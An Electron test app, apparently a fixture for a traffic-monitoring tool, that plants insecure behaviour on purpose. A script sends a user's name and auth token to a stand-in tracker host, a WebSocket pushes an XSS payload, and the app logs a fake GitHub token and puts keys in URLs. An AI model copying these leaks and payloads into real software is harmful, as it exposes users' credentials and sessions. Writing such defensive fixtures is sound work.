// Test application for watch mode's traffic checks: a local backend (reached under made-up host names through
// Chromium's host resolver rules) that sets a cookie without flags, takes a token in the URL, forwards what the user typed
// to a "tracker" host, and pushes HTML over a WebSocket. The page also logs a token, throws, and breaks its CSP.
const { app, BrowserWindow } = require('electron');
const http = require('http');
const crypto = require('crypto');


app.commandLine.appendSwitch('host-resolver-rules', 'MAP app.traffic.test 127.0.0.1, MAP tracker.other.test 127.0.0.1');
const TOKEN = 'ghp_' + 'A1b2C3d4E5f6G7h8I9j0K1l2M3n4O5p6Q7r8';

function sendWsText(socket, text) {
  const payload = Buffer.from(text);
  const header = payload.length < 126 ? Buffer.from([0x81, payload.length]) : Buffer.from([0x81, 126, payload.length >> 8, payload.length & 0xff]);
  socket.write(Buffer.concat([header, payload]));
}

app.whenReady().then(async () => {
  const server = http.createServer((request, response) => {
    const url = new URL(request.url, 'http://x');
    const host = String(request.headers.host || '').split(':')[0];
    if (host === 'tracker.other.test') {
      response.setHeader('access-control-allow-origin', '*');
      response.setHeader('access-control-allow-headers', '*');
      return response.end('ok');
    }
    if (url.pathname === '/api/login') {
      request.resume();
      response.setHeader('set-cookie', 'session=Zk2Qm9Lr7Tx4Wv1Yp8Nb; Path=/');
      response.setHeader('content-type', 'application/json');
      return response.end(JSON.stringify({ ok: true, token: 'eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTYifQ.c2lnbmF0dXJlLXZhbHVlLTEyMzQ1Ng' }));
    }
    if (url.pathname.startsWith('/api/')) {
      response.setHeader('content-type', 'application/json');
      return response.end('{"id":1234}');
    }
    response.setHeader('content-security-policy', "script-src 'self'");
    if (url.pathname === '/app.js') {
      response.setHeader('content-type', 'application/javascript');
      return response.end(`
        (async () => {
          const port = location.port;
          await fetch('/api/login', { method: 'POST', headers: { 'content-type': 'application/x-www-form-urlencoded' }, body: 'user=alice&display=AliceSmithTraffic' });
          await fetch('/api/items/1234?access_token=Qx7Lm2Vt9Rk4Zp8Wn3Yb6Hs', { headers: { Authorization: 'Bearer Qx7Lm2Vt9Rk4Zp8Wn3Yb6Hs' } });
          await fetch('http://tracker.other.test:' + port + '/collect?name=AliceSmithTraffic', { headers: { 'X-Auth-Token': 'Qx7Lm2Vt9Rk4Zp8Wn3Yb6Hs' } }).catch(() => {});
          // the named host shows the cleartext socket (its handshake fails under host resolver rules); the loopback one
          // delivers a message
          new WebSocket('ws://app.traffic.test:' + port + '/socket').onerror = () => {};
          new WebSocket('ws://127.0.0.1:' + port + '/socket').onmessage = () => {};
          console.log('debug token ${TOKEN}');
          const s = document.createElement('script'); s.textContent = 'window.inlineRan = 1'; document.body.appendChild(s);
          setTimeout(() => { throw new Error('traffic-app page failure'); }, 0);
        })();`);
    }
    response.setHeader('content-type', 'text/html');
    response.end('<!doctype html><title>Traffic</title><p>app</p><script src="/app.js"></script>');
  });
  server.on('upgrade', (request, socket) => {
    const accept = crypto.createHash('sha1').update(request.headers['sec-websocket-key'] + '258EAFA5-E914-47DA-95CA-C5AB0DC85B11').digest('base64');
    socket.write(`HTTP/1.1 101 Switching Protocols\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Accept: ${accept}\r\n\r\n`);
    sendWsText(socket, '{"from":"bob","html":"<img src=x onerror=alert(1)>"}');
    socket.on('error', () => {});
  });
  server.listen(0, '127.0.0.1');
  await new Promise(resolve => server.once('listening', resolve));
  const port = server.address().port;
  // the main process calls the backend itself, with a key in the URL
  http.get({ host: '127.0.0.1', port, path: '/api/status?api_key=Tr4ff1cK3yM41nPr0c3ss99' }, (res) => res.resume()).on('error', () => {});
  console.log('main process token', TOKEN);

  const win = new BrowserWindow({ show: false });
  await win.loadURL(`http://app.traffic.test:${port}/`);
  setTimeout(() => { server.close(); app.quit(); }, 3000);
});
